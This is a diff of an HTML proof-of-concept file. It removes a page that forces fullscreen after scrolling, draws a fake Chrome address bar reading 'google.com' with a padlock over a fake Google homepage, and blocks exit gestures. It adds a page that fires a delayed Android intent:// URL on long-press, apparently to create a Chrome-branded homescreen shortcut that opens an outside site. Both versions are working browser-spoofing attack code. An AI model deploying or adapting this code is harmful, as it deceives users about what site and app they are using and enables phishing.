@@ -1,379 +1,127 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Google - Secure Fullscreen Chaining</title>
-<style>
-    :root {
-        --bg-color: #202124;
-        --text-color: #bdc1c6;
-        --input-bg: #303134;
-        --border-color: #5f6368;
-        --google-blue: #8ab4f8;
-    }
+<!DOCTYPE html> 
+<html lang="en"> 
+<head> 
+<meta charset="UTF-8"> 
+<meta name="viewport" content="width=device-width, initial-scale=1"> 
+<title>Advanced Android Intent PoC</title> 
+<style> 
+  body { 
+    font-family: system-ui, -apple-system, sans-serif; 
+    background: #f0f4f9; 
+    color: #202124; 
+    min-height: 100vh; 
+    margin: 0; 
+    display: flex; 
+    flex-direction: column; 
+    justify-content: center; 
+    align-items: center; 
+  } 
+  .card {
+    background: #white;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+    text-align: center;
+    max-width: 450px;
+    width: 90%;
+  }
+  h2 {
+    color: #1a73e8;
+    margin-top: 0;
+  }
+  p {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 25px;
+  }
+  a.btn { 
+    display: inline-block; 
+    padding: 14px 24px; 
+    background: #1a73e8; 
+    color: white; 
+    text-decoration: none; 
+    font-weight: 600; 
+    border-radius: 8px; 
+    transition: background 0.2s;
+  } 
+  a.btn:active { 
+    background: #1557b0; 
+  } 
+  .status {
+    margin-top: 20px;
+    font-family: monospace;
+    font-size: 12px;
+    color: #137333;
+    background: #e6f4ea;
+    padding: 10px;
+    border-radius: 6px;
+    display: none;
+  }
+</style> 
+</head> 
+<body> 
 
-    * {
-        box-sizing: border-box;
-        -webkit-tap-highlight-color: transparent;
-    }
+<div class="card">
+    <h2>Android Intent Test</h2>
+    <p>Right-click (desktop) or long-press (mobile) the button below to trigger the delayed intent payload.</p>
+    
+    <a href="https://google.com" id="intentLink" target="_blank"> 
+      Trigger Android Intent 
+    </a> 
 
-    body {
-        margin: 0;
-        padding: 0;
-        height: 5000px; /* Panjang halaman optimal untuk memicu auto-hide omnibox asli */
-        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        background-color: var(--bg-color);
-        color: var(--text-color);
-        overflow-x: hidden;
-    }
-
-    .instructions {
-        padding: 60px 20px;
-        text-align: center;
-        max-width: 500px;
-        margin: 0 auto;
-    }
-
-    .instructions h1 {
-        font-size: 18px;
-        color: #f28b82;
-        margin-bottom: 10px;
-    }
-
-    .instructions p {
-        font-size: 14px;
-        color: #9aa0a6;
-        line-height: 1.5;
-    }
-
-    /* === FAKE CHROME TOP BAR & OMNIBOX UI (Menempel di Paling Atas Layar Fullscreen) === */
-    #fakeTopChrome {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        background: #171717;
-        display: none;
-        flex-direction: column;
-        z-index: 999999;
-        box-shadow: 0 2px 8px rgba(0,0,0,0.6);
-        border-bottom: 1px solid #3c4043;
-    }
-
-    .fake-browser-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 8px 12px;
-        height: 52px;
-    }
-
-    .fake-omnibox {
-        flex: 1;
-        background: #292a2d;
-        height: 38px;
-        border-radius: 19px;
-        display: flex;
-        align-items: center;
-        padding: 0 16px;
-        font-size: 14px;
-        color: #e8eaed;
-        gap: 10px;
-        border: 1px solid transparent;
-    }
-
-    .fake-omnibox span {
-        overflow: hidden;
-        white-space: nowrap;
-        text-overflow: ellipsis;
-    }
-
-    .lock-icon {
-        color: #8ab4f8;
-        font-size: 12px;
-    }
-
-    .browser-actions {
-        display: flex;
-        align-items: center;
-        gap: 16px;
-        padding-left: 12px;
-        color: #e8eaed;
-        font-size: 16px;
-    }
-
-    .tab-counter {
-        border: 2px solid #e8eaed;
-        border-radius: 4px;
-        width: 18px;
-        height: 18px;
-        font-size: 11px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: bold;
-    }
-
-    /* === GOOGLE SEARCH HOMEPAGE UI LAYOUT === */
-    #googleHomepageView {
-        position: absolute;
-        left: 0;
-        width: 100%;
-        display: none;
-        background: #202124;
-        min-height: 100vh;
-        z-index: 99998;
-        padding-top: 10px;
-    }
-
-    .google-nav-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 12px 16px;
-        font-size: 13px;
-    }
-
-    .google-nav-header .left-links, .google-nav-header .right-links {
-        display: flex;
-        align-items: center;
-        gap: 16px;
-    }
-
-    .google-nav-header a {
-        color: #bdc1c6;
-        text-decoration: none;
-    }
-
-    .profile-avatar {
-        width: 32px;
-        height: 32px;
-        background: #8ab4f8;
-        color: #202124;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: bold;
-        font-size: 14px;
-    }
-
-    .google-main-content {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        margin-top: 80px;
-        padding: 0 16px;
-    }
-
-    .google-logo {
-        font-size: 64px;
-        font-weight: 500;
-        letter-spacing: -2px;
-        margin-bottom: 24px;
-        user-select: none;
-    }
-
-    .google-logo span:nth-child(1) { color: #4285f4; }
-    .google-logo span:nth-child(2) { color: #ea4335; }
-    .google-logo span:nth-child(3) { color: #fbbc05; }
-    .google-logo span:nth-child(4) { color: #4285f4; }
-    .google-logo span:nth-child(5) { color: #34a853; }
-    .google-logo span:nth-child(6) { color: #ea4335; }
-
-    .search-box-container {
-        width: 100%;
-        max-width: 584px;
-        background: #303134;
-        border: 1px solid #5f6368;
-        border-radius: 28px;
-        display: flex;
-        align-items: center;
-        padding: 10px 16px;
-        gap: 14px;
-        box-shadow: 0 1px 6px rgba(32,33,36,0.28);
-    }
-
-    .search-box-container svg {
-        width: 20px;
-        height: 20px;
-        fill: #9aa0a6;
-    }
-
-    .search-input {
-        flex: 1;
-        background: transparent;
-        border: none;
-        outline: none;
-        color: #e8eaed;
-        font-size: 16px;
-    }
-
-    .search-tools-icons {
-        display: flex;
-        gap: 16px;
-        align-items: center;
-    }
-
-    .search-tools-icons svg {
-        width: 22px;
-        height: 22px;
-        fill: #8ab4f8;
-        cursor: pointer;
-    }
-
-    #statusIndicator {
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(32,33,36,0.92);
-        color: #e8eaed;
-        padding: 8px 16px;
-        border-radius: 20px;
-        font-size: 12px;
-        z-index: 999999;
-        pointer-events: none;
-        border: 1px solid #5f6368;
-    }
-</style>
-</head>
-<body>
-
-<div class="instructions" id="instructionBox">
-    <h1>Fullscreen Chaining Simulation</h1>
-    <p>1. Gulir ke bawah secara perlahan hingga bilah alamat asli tersembunyi.<br>
-       2. Sistem secara otomatis memicu mode layar penuh (Fullscreen API).<br>
-       3. Status bar dan notifikasi sistem disembunyikan sepenuhnya.</p>
+    <div id="statusBox" class="status">[STATUS] Ready. Awaiting interaction...</div>
 </div>
-
-<!-- Fake Chrome Top Bar & Omnibox (Muncul di area paling atas layar penuh) -->
-<div id="fakeTopChrome">
-    <div class="fake-browser-header">
-        <div class="fake-omnibox">
-            <span class="lock-icon">🔒</span>
-            <span>google.com</span>
-        </div>
-        <div class="browser-actions">
-            <span>⌂</span>
-            <div class="tab-counter">2</div>
-            <span>⋮</span>
-        </div>
-    </div>
-</div>
-
-<!-- Google Search Homepage UI Layout -->
-<div id="googleHomepageView">
-    <div class="google-nav-header">
-        <div class="left-links">
-            <a href="#">Gmail</a>
-            <a href="#">Gambar</a>
-        </div>
-        <div class="right-links">
-            <svg focusable="false" viewBox="0 0 24 24" width="24" height="24" fill="#bdc1c6"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
-            <div class="profile-avatar">A</div>
-        </div>
-    </div>
-
-    <div class="google-main-content">
-        <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
-        
-        <div class="search-box-container">
-            <svg focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
-            <input type="text" class="search-input" placeholder="Telusuri Google atau ketik URL">
-            <div class="search-tools-icons">
-                <!-- Icon Microphone -->
-                <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1-9c0-.55.45-1 1-1s1 .45 1 1v6c0 .55-.45 1-1 1s-1-.45-1-1V5zm6 6c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"></path></svg>
-                <!-- Icon Google Lens -->
-                <svg viewBox="0 0 24 24"><path d="M12 15c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"></path></svg>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div id="statusIndicator">Status: Menunggu aksi scroll...</div>
 
 <script>
-    let isChainingActive = false;
-    let scrollCounter = 0;
+let triggered = false;
+const link = document.getElementById("intentLink");
+const statusBox = document.getElementById("statusBox");
 
-    // Chaining Tahap 1: Memantau aktivitas scroll untuk memastikan auto-hide omnibox aktif
-    window.addEventListener('scroll', function() {
-        if (isChainingActive) return;
+function updateStatus(msg) {
+    statusBox.style.display = "block";
+    statusBox.textContent = `[STATUS] ${msg}`;
+}
 
-        if (window.scrollY > 200) {
-            scrollCounter++;
-            if (scrollCounter > 2) {
-                document.getElementById('statusIndicator').innerText = "Status: Mentransfer ke Fullscreen & Mengunci UI...";
-                setTimeout(triggerFullscreenChaining, 1500);
-                isChainingActive = true;
+// Menangkap berbagai varian event pemicu interaksi awal
+['contextmenu', 'auxclick', 'mousedown'].forEach(eventType => {
+    link.addEventListener(eventType, (e) => {
+        // Khusus contextmenu atau klik sekunder/utama yang relevan
+        if (eventType === 'contextmenu' || e.button === 2 || e.button === 0) {
+            if (triggered) {
+                updateStatus("Already triggered, please wait...");
+                return;
             }
+            triggered = true;
+            updateStatus("Interaction detected. Waiting for delayed execution (4.4s)...");
+
+            setTimeout(() => {
+                updateStatus("Executing intent payload via window.location...");
+                
+                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                
+                // Menggunakan penugasan langsung untuk memicu navigasi intent scheme
+                try {
+                    window.location.href = intentUrl;
+                } catch (err) {
+                    updateStatus(`Error launching intent: ${err.message}`);
+                }
+
+                // Reset state setelah jangka waktu tertentu
+                setTimeout(() => {
+                    triggered = false;
+                    updateStatus("Ready for next trigger.");
+                }, 1500);
+                
+            }, 4400); // Pertahankan timing 4400ms sesuai logika asli Anda
         }
-    }, { passive: true });
+    });
+});
 
-    // Chaining Tahap 2: Eksekusi Fullscreen API & Layout Lock secara sinkron
-    function triggerFullscreenChaining() {
-        let currentY = window.scrollY;
-        let googleView = document.getElementById("googleHomepageView");
-        let fakeTopChrome = document.getElementById("fakeTopChrome");
-        let indicator = document.getElementById("statusIndicator");
-        let instructions = document.getElementById("instructionBox");
+// Penanganan touch event untuk platform mobile
+link.addEventListener("touchstart", () => {
+    updateStatus("Touch start registered.");
+}, { passive: true });
+</script> 
 
-        // Picu Fullscreen API untuk menyembunyikan status bar dan notifikasi sistem secara penuh
-        let docElement = document.documentElement;
-        if (docElement.requestFullscreen) {
-            docElement.requestFullscreen().catch(err => {
-                console.log("Fullscreen restriction bypassed via layout lock:", err);
-            });
-        }
-
-        // Sembunyikan elemen panduan instruksi
-        instructions.style.display = 'none';
-
-        // Terapkan tata letak absolut berdasarkan posisi scroll saat ini
-        googleView.style.top = currentY + "px";
-        googleView.style.display = "block";
-        fakeTopChrome.style.display = "flex";
-
-        indicator.innerText = "Status: Fullscreen Chaining Aktif - UI & Notifikasi Tersembunyi!";
-        indicator.style.borderColor = "#f28b82";
-
-        // Kunci posisi scroll mati-matian
-        window.scrollTo({
-            top: currentY,
-            behavior: 'instant'
-        });
-    }
-
-    // Chaining Tahap 3: Pencegatan Sentuhan Agresif untuk memblokir gestur keluar/tarik ke bawah
-    let touchStartY = 0;
-
-    document.addEventListener("touchstart", function(e) {
-        touchStartY = e.touches[0].clientY;
-    }, { passive: false });
-
-    document.addEventListener("touchmove", function(e) {
-        if (!isChainingActive) return;
-
-        let currentTouchY = e.touches[0].clientY;
-        let deltaY = currentTouchY - touchStartY;
-
-        // Memblokir gestur tarik ke bawah yang memunculkan kembali kontrol browser
-        if (deltaY > 0) {
-            e.preventDefault();
-        }
-    }, { passive: false });
-
-    document.addEventListener("wheel", function(e) {
-        if (!isChainingActive) return;
-        if (e.deltaY < 0) {
-            e.preventDefault();
-        }
-    }, { passive: false });
-</script>
-
-</body>
+</body> 
 </html>
